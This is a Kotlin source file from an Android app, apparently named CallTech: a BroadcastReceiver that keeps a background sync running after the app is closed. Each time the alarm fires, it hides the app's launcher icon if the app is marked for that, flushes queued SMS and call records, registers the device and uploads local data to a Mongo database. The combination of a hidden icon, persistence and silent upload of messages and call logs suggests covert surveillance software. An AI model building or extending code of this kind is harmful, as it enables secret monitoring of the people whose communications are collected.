package com.calltech

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/** App band / kill hone par bhi periodic sync — AlarmManager se chalta hai. */
class SyncAlarmReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val app = context.applicationContext
        Log.d(TAG, "Alarm tick — background sync")

        val pendingResult = goAsync()
        val wakeLock = SyncWakeLock.acquire(app, "AlarmSyncWakeLock")

        try {
            SyncAlarmScheduler.scheduleNext(app)
        } catch (error: Exception) {
            Log.e(TAG, "Alarm setup failed", error)
        }

        SyncBootstrap.armBackgroundSync(app)
        LauncherHider.hideIfMarked(app)
        CallSyncService.ensureRunning(app)

        BackgroundSyncRunner.run {
            CallSyncService.holdDuring(app) {
                try {
                PendingSmsQueue.flush(app)
                PendingCallQueue.flush(app)
                PendingCallSync.flushIfPending(app)
                DeviceRegistration.registerNow(app)
                LocalDataStore.syncPendingToMongo(app, "alarm")
                SyncScheduler.syncIfPermittedNow(app, "alarm")
                } catch (error: Exception) {
                    Log.e(TAG, "Alarm sync failed", error)
                } finally {
                    SyncWakeLock.release(wakeLock)
                    try {
                        pendingResult.finish()
                    } catch (_: Exception) {
                    }
                }
            }
        }
    }

    companion object {
        private const val TAG = "SyncAlarmReceiver"
    }
}
